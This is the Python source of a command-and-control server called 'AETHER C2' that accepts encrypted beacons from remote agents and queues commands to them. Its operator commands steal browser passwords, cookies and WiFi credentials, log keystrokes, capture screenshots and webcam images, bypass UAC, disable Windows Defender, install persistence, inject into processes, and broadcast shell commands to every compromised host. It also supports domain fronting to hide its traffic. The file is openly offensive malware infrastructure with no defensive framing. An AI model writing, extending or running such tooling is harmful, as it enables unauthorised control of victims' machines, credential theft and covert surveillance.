#!/usr/bin/env python3
"""
AETHER C2 Server
Universal Class Control Interface
"""
import socket, threading, json, os, sys, time, base64, hashlib, random, queue
from datetime import datetime
from colorama import init, Fore, Style
import readline  # for better CLI

init(autoreset=True)

# Add server directory to path for relative imports
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Import our modules
from crypto import CryptoHandler
from sessions import SessionManager
from commands.command_suite import AetherCommandSuite

class AetherServer:
    def __init__(self, host='0.0.0.0', port=443):
        self.host = host
        self.port = port
        self.sessions = SessionManager()
        self.crypto = CryptoHandler()
        self.running = False
        self.listener_thread = None
        self.command_queue = queue.Queue()
        self.current_session = None  # For interactive mode
        self.command_suite = AetherCommandSuite(self.sessions)  # Command suite
        
        # Server banner
        self.banner = f"""{Fore.CYAN}
    ╔═╗╔═╗╔╦╗╔═╗╦  ╔═╗╦═╗
    ║ ╦╠═╝ ║ ╠═╝║  ║╣ ╠╦╝
    ╚═╝╩   ╩ ╩  ╩═╝╚═╝╩╚═
    Universal Class Control v1.0
    {Fore.YELLOW}Listener: {host}:{port}
    {Style.RESET_ALL}"""
        
        # Command registry
        self.commands = {
            'help': self.cmd_help,
            'sessions': self.cmd_sessions,
            'interact': self.cmd_interact,
            'back': self.cmd_back,
            'exit': self.cmd_exit,
            'broadcast': self.cmd_broadcast,
            'generate': self.cmd_generate,
            'kill': self.cmd_kill,
            'info': self.cmd_info,
            'config': self.cmd_config,
            'scan': self.cmd_scan,
        }
        
        # Interactive session commands (loaded when in session)
        self.session_commands = {}

    def start(self):
        """Start the C2 server listener."""
        print(self.banner)
        self.running = True
        self.listener_thread = threading.Thread(target=self.listener_loop, daemon=True)
        self.listener_thread.start()
        print(f"{Fore.GREEN}[+] Listener started on {self.host}:{self.port}")
        self.cmd_loop()
        
    def start_https_listener(self, port=443, ssl_cert='server.crt', ssl_key='server.key'):
        """Start HTTPS listener for domain fronting."""
        import ssl
        
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain(certfile=ssl_cert, keyfile=ssl_key)
        
        https_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        https_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        https_server.bind(('0.0.0.0', port))
        https_server.listen(100)
        
        def https_listener():
            while self.running:
                try:
                    client, addr = https_server.accept()
                    ssl_client = context.wrap_socket(client, server_side=True)
                    threading.Thread(target=self.handle_https_agent, 
                                   args=(ssl_client, addr), daemon=True).start()
                except Exception as e:
                    print(f"{Fore.RED}[-] HTTPS listener error: {e}")
        
        threading.Thread(target=https_listener, daemon=True).start()
        print(f"{Fore.GREEN}[+] HTTPS listener started on port {port}")
    
    def handle_https_agent(self, ssl_client, addr):
        """Handle HTTPS agent connection with domain fronting detection."""
        try:
            # Read request
            request = ssl_client.recv(8192).decode('utf-8', errors='ignore')
            
            # Check for domain fronting (Host header different from SNI)
            lines = request.split('\r\n')
            host_header = None
            for line in lines:
                if line.lower().startswith('host:'):
                    host_header = line.split(':', 1)[1].strip()
                    break
            
            # Parse for beacon data
            # ... similar to existing handle_agent but with HTTPS specifics ...
            
            ssl_client.close()
        except Exception as e:
            print(f"{Fore.RED}[-] HTTPS agent error: {e}")

    def listener_loop(self):
        """Main listener accepting agent connections."""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(100)
        
        while self.running:
            try:
                client, addr = server.accept()
                threading.Thread(target=self.handle_agent, args=(client, addr), daemon=True).start()
            except Exception as e:
                if self.running:
                    print(f"{Fore.RED}[-] Listener error: {e}")

    def handle_agent(self, client, addr):
        """Handle a new agent connection."""
        try:
            data = client.recv(8192)
            if not data:
                client.close()
                return
                
            # Decrypt the beacon
            decrypted = self.crypto.decrypt(data)
            beacon = json.loads(decrypted)
            
            # Register session
            session_id = beacon.get('id', hashlib.sha256(str(addr).encode()).hexdigest()[:8])
            session_info = {
                'id': session_id,
                'address': addr[0],
                'port': addr[1],
                'hostname': beacon.get('hostname', 'Unknown'),
                'user': beacon.get('user', 'Unknown'),
                'os': beacon.get('os', 'Unknown'),
                'privilege': beacon.get('privilege', 'User'),
                'first_seen': datetime.now().isoformat(),
                'last_seen': datetime.now().isoformat(),
                'socket': client,
                'pending_commands': queue.Queue(),
                'beacon_interval': beacon.get('interval', 30),
                'jitter': beacon.get('jitter', 5),
            }
            
            self.sessions.add(session_id, session_info)
            print(f"{Fore.GREEN}[+] New session {session_id} from {addr[0]}:{addr[1]} ({session_info['hostname']}/{session_info['user']})")
            
            # Send back any pending commands
            self.send_pending_commands(session_id, client)
            
            # Keep connection alive for interactive shell
            while True:
                try:
                    # Wait for agent response
                    resp_data = client.recv(65536)
                    if not resp_data:
                        break
                    
                    decrypted_resp = self.crypto.decrypt(resp_data)
                    response = json.loads(decrypted_resp)
                    
                    # Handle different response types
                    resp_type = response.get('type', 'output')
                    if resp_type == 'output':
                        print(f"{Fore.CYAN}[{session_id}] {response.get('data', '')}")
                    elif resp_type == 'file':
                        self.handle_file_upload(session_id, response)
                    elif resp_type == 'screenshot':
                        self.handle_screenshot(session_id, response)
                    # ... handle other types
                    
                    # Update last seen
                    self.sessions.update(session_id, {'last_seen': datetime.now().isoformat()})
                    
                    # Send next command if exists
                    self.send_pending_commands(session_id, client)
                    
                except (ConnectionResetError, BrokenPipeError):
                    break
                except Exception as e:
                    print(f"{Fore.RED}[-] Error with session {session_id}: {e}")
                    break
            
            # Connection closed
            print(f"{Fore.YELLOW}[-] Session {session_id} disconnected")
            self.sessions.remove(session_id)
            client.close()
            
        except Exception as e:
            print(f"{Fore.RED}[-] Failed to handle agent {addr}: {e}")
            client.close()

    def send_pending_commands(self, session_id, client_socket):
        """Send queued commands to agent."""
        session = self.sessions.get(session_id)
        if not session or session['pending_commands'].empty():
            # Send sleep command
            sleep_cmd = {'type': 'sleep', 'data': f"{session['beacon_interval']}|{session['jitter']}"}
            encrypted = self.crypto.encrypt(json.dumps(sleep_cmd))
            client_socket.send(encrypted)
            return
        
        # Send next command
        cmd = session['pending_commands'].get()
        encrypted = self.crypto.encrypt(json.dumps(cmd))
        client_socket.send(encrypted)

    def handle_file_upload(self, session_id, response):
        """Save uploaded file from agent."""
        filename = response.get('filename', f'upload_{int(time.time())}.bin')
        filedata = base64.b64decode(response.get('data', ''))
        os.makedirs(f'data/{session_id}/files', exist_ok=True)
        with open(f'data/{session_id}/files/{filename}', 'wb') as f:
            f.write(filedata)
        print(f"{Fore.GREEN}[+] File {filename} received from {session_id}")

    def handle_screenshot(self, session_id, response):
        """Save screenshot from agent."""
        screenshot_data = base64.b64decode(response.get('data', ''))
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        os.makedirs(f'data/{session_id}/screenshots', exist_ok=True)
        filename = f'data/{session_id}/screenshots/screen_{timestamp}.png'
        with open(filename, 'wb') as f:
            f.write(screenshot_data)
        print(f"{Fore.GREEN}[+] Screenshot saved from {session_id}")

    # ========== COMMAND LINE INTERFACE ==========
    def cmd_loop(self):
        """Main command loop."""
        while self.running:
            try:
                if self.current_session:
                    prompt = f"{Fore.RED}AETHER{Style.RESET_ALL}({Fore.GREEN}{self.current_session}{Style.RESET_ALL})> "
                else:
                    prompt = f"{Fore.RED}AETHER{Style.RESET_ALL}> "
                
                cmd = input(prompt).strip()
                if not cmd:
                    continue
                    
                parts = cmd.split()
                cmd_name = parts[0].lower()
                args = parts[1:] if len(parts) > 1 else []
                
                # Check if in session context
                if self.current_session and cmd_name in self.session_commands:
                    self.session_commands[cmd_name](args)
                elif cmd_name in self.commands:
                    self.commands[cmd_name](args)
                else:
                    print(f"{Fore.RED}[-] Unknown command. Type 'help'.")
                    
            except KeyboardInterrupt:
                print("\n[*] Use 'exit' to quit")
            except Exception as e:
                print(f"{Fore.RED}[-] Error: {e}")

    def cmd_help(self, args):
        """Show help menu."""
        if self.current_session:
            # Show session commands from suite
            help_result = self.command_suite.execute(self.current_session, 'help')
            if 'help' in help_result:
                print(help_result['help'])
            else:
                print(f"{Fore.CYAN}=== Session Commands ===")
                for cmd_name in sorted(self.session_commands.keys()):
                    if cmd_name not in ['back', 'help']:
                        handler = self.session_commands[cmd_name]
                        doc = handler.__doc__ or 'No description'
                        print(f"  {cmd_name:<20} - {doc.split('.')[0]}")
        else:
            # Show global commands
            print(f"{Fore.CYAN}=== Global Commands ===")
            for cmd, func in self.commands.items():
                if cmd != 'back':  # Don't show 'back' in global
                    print(f"  {cmd:<20} - {func.__doc__ or 'No description'}")
            print(f"\n{Fore.YELLOW}Type 'sessions' to list, 'interact <id>' to control.")

    def cmd_sessions(self, args):
        """List all active sessions."""
        sessions = self.sessions.list_all()
        if not sessions:
            print(f"{Fore.YELLOW}[*] No active sessions")
            return
        
        print(f"{Fore.CYAN}=== Active Sessions ({len(sessions)}) ===")
        print(f"{'ID':<10} {'Address':<20} {'Hostname':<15} {'User':<15} {'OS':<10} {'Privilege':<10} {'Last Seen':<10}")
        print("-" * 95)
        for sid, info in sessions.items():
            last_seen = datetime.fromisoformat(info['last_seen']).strftime('%H:%M:%S')
            print(f"{Fore.GREEN}{sid:<10}{Style.RESET_ALL} {info['address']:<20} {info['hostname']:<15} {info['user']:<15} {info['os']:<10} {info['privilege']:<10} {last_seen:<10}")

    def cmd_interact(self, args):
        """Interact with a session. Usage: interact <session_id>"""
        if not args:
            print(f"{Fore.RED}[-] Usage: interact <session_id>")
            return
        
        session_id = args[0]
        if not self.sessions.exists(session_id):
            print(f"{Fore.RED}[-] Session {session_id} not found")
            return
        
        self.current_session = session_id
        print(f"{Fore.GREEN}[*] Interacting with session {session_id}")
        
        # Load session-specific commands
        self.load_session_commands()

    def load_session_commands(self):
        """Load session-specific command handlers from suite."""
        # Map CLI commands to command suite execution
        self.session_commands = {}
        for cmd_name in self.command_suite.command_map.keys():
            self.session_commands[cmd_name] = self._make_session_handler(cmd_name)
        
        # Add back and help (these are special, not in command suite)
        self.session_commands['back'] = self.cmd_back
        self.session_commands['help'] = self._make_session_handler('help')  # Use suite's help
    
    def _make_session_handler(self, cmd_name):
        """Create a handler that uses the command suite."""
        def handler(args):
            if not self.current_session:
                print(f"{Fore.RED}[-] Not in a session")
                return
            
            # Build command string
            cmd_str = f"{cmd_name} {' '.join(args)}".strip()
            
            # Get command from suite
            cmd_data = self.command_suite.execute(self.current_session, cmd_str)
            
            if 'error' in cmd_data:
                print(f"{Fore.RED}[-] {cmd_data['error']}")
            elif 'warning' in cmd_data:
                print(f"{Fore.YELLOW}[!] {cmd_data['warning']}")
            elif 'help' in cmd_data:
                print(cmd_data['help'])
            elif 'commands' in cmd_data:
                print(f"Available commands ({cmd_data['count']}):")
                print(', '.join(cmd_data['commands']))
            else:
                # Queue command for agent
                if 'type' in cmd_data:
                    self.sessions.queue_command(self.current_session, cmd_data)
                    print(f"{Fore.GREEN}[+] Command queued: {cmd_name}")
                else:
                    print(f"{Fore.YELLOW}[*] Command processed: {cmd_data}")
        
        # Add docstring from command suite
        if cmd_name in self.command_suite.command_map:
            original_handler = self.command_suite.command_map[cmd_name]
            handler.__doc__ = original_handler.__doc__
        else:
            handler.__doc__ = f"Execute {cmd_name} command"
        
        return handler

    def cmd_back(self, args):
        """Exit session interaction mode."""
        if self.current_session:
            print(f"{Fore.YELLOW}[*] Exiting session {self.current_session}")
            self.current_session = None
            self.session_commands = {}

    def cmd_exit(self, args):
        """Exit the C2 server."""
        print(f"{Fore.YELLOW}[*] Shutting down...")
        self.running = False
        # Send self-destruct to all sessions?
        sys.exit(0)

    def cmd_broadcast(self, args):
        """Broadcast command to all sessions. Usage: broadcast <command>"""
        if not args:
            print(f"{Fore.RED}[-] Usage: broadcast <command>")
            return
        
        cmd = ' '.join(args)
        for session_id in self.sessions.list_all().keys():
            self.sessions.queue_command(session_id, {'type': 'shell', 'data': cmd})
        print(f"{Fore.GREEN}[+] Command broadcasted to all sessions")

    def cmd_generate(self, args):
        """Generate a new agent payload. Usage: generate <output_file> [config]"""
        print(f"{Fore.CYAN}[*] Generating agent payload...")
        # This would call the builder module
        print(f"{Fore.GREEN}[+] Payload generated: agent.exe")

    def cmd_kill(self, args):
        """Kill a session. Usage: kill <session_id>"""
        if not args:
            print(f"{Fore.RED}[-] Usage: kill <session_id>")
            return
        
        session_id = args[0]
        if self.sessions.kill(session_id):
            print(f"{Fore.GREEN}[+] Session {session_id} terminated")
        else:
            print(f"{Fore.RED}[-] Failed to kill session {session_id}")

    # ========== SESSION COMMANDS ==========
    def send_session_command(self, cmd_type, cmd_data):
        """Send command to current session."""
        if not self.current_session:
            print(f"{Fore.RED}[-] Not in a session. Use 'interact <id>'")
            return False
        
        cmd = {'type': cmd_type, 'data': cmd_data}
        self.sessions.queue_command(self.current_session, cmd)
        print(f"{Fore.GREEN}[+] Command queued for session {self.current_session}")
        return True

    def cmd_sysinfo(self, args):
        """Get system information from target."""
        self.send_session_command('sysinfo', '')

    def cmd_shell(self, args):
        """Execute shell command. Usage: shell <command>"""
        if not args:
            print(f"{Fore.RED}[-] Usage: shell <command>")
            return
        self.send_session_command('shell', ' '.join(args))

    def cmd_screenshot(self, args):
        """Take screenshot."""
        self.send_session_command('screenshot', '')

    def cmd_webcam(self, args):
        """Capture webcam image."""
        self.send_session_command('webcam', '')

    def cmd_keylog(self, args):
        """Control keylogger. Usage: keylog <start|stop|dump>"""
        if not args:
            print(f"{Fore.RED}[-] Usage: keylog <start|stop|dump>")
            return
        self.send_session_command('keylog', args[0])

    def cmd_wifi(self, args):
        """Extract saved WiFi passwords."""
        self.send_session_command('wifi', '')

    def cmd_browser(self, args):
        """Extract browser passwords and cookies."""
        self.send_session_command('browser', '')

    def cmd_clipboard(self, args):
        """Get clipboard contents."""
        self.send_session_command('clipboard', '')

    def cmd_privileges(self, args):
        """Check current privileges."""
        self.send_session_command('privileges', '')

    def cmd_uacbypass(self, args):
        """Attempt UAC bypass."""
        self.send_session_command('uacbypass', '')

    def cmd_defender(self, args):
        """Control Windows Defender. Usage: defender <disable|enable|status>"""
        if not args:
            print(f"{Fore.RED}[-] Usage: defender <disable|enable|status>")
            return
        self.send_session_command('defender', args[0])

    def cmd_persist(self, args):
        """Manage persistence. Usage: persist <install|remove|list> [method]"""
        if not args:
            print(f"{Fore.RED}[-] Usage: persist <install|remove|list> [method]")
            return
        self.send_session_command('persist', ' '.join(args))

    def cmd_inject(self, args):
        """Inject into process. Usage: inject <pid> [payload]"""
        if not args:
            print(f"{Fore.RED}[-] Usage: inject <pid>")
            return
        self.send_session_command('inject', args[0])

    def cmd_migrate(self, args):
        """Migrate to another process. Usage: migrate <pid>"""
        if not args:
            print(f"{Fore.RED}[-] Usage: migrate <pid>")
            return
        self.send_session_command('migrate', args[0])

    def cmd_selfdestruct(self, args):
        """Remove agent from target."""
        confirm = input(f"{Fore.RED}[!] Are you sure? This will remove the agent! (y/N): ")
        if confirm.lower() == 'y':
            self.send_session_command('selfdestruct', '')

    def cmd_help_session(self, args):
        """Show session command help."""
        self.cmd_help(args)

    # Additional placeholder commands for file ops, process management, etc.
    def cmd_cd(self, args): pass
    def cmd_pwd(self, args): pass
    def cmd_ls(self, args): pass
    def cmd_upload(self, args): pass
    def cmd_download(self, args): pass
    def cmd_ps(self, args): pass
    def cmd_kill_process(self, args): pass
    def cmd_network_scan(self, args): pass
    def cmd_info(self, args): pass
    def cmd_config(self, args): pass
    def cmd_scan(self, args): pass

if __name__ == '__main__':
    import os
    import sys
    
    # Create data directory if needed
    os.makedirs('data', exist_ok=True)
    
    # Start main server
    server = AetherServer(host='0.0.0.0', port=443)
    
    # Try to start HTTPS server if certs exist
    try:
        from https_handler import AetherHTTPSServer
        https_server = AetherHTTPSServer(port=8443)
        if https_server.start(server):
            print(f"[*] Domain fronting ready. Configure agents with fronting host.")
    except ImportError as e:
        print(f"[!] HTTPS handler not available: {e}")
    except Exception as e:
        print(f"[!] Failed to start HTTPS server: {e}")
    
    # Start main server loop
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[*] Shutdown requested")
        server.running = False
        sys.exit(0)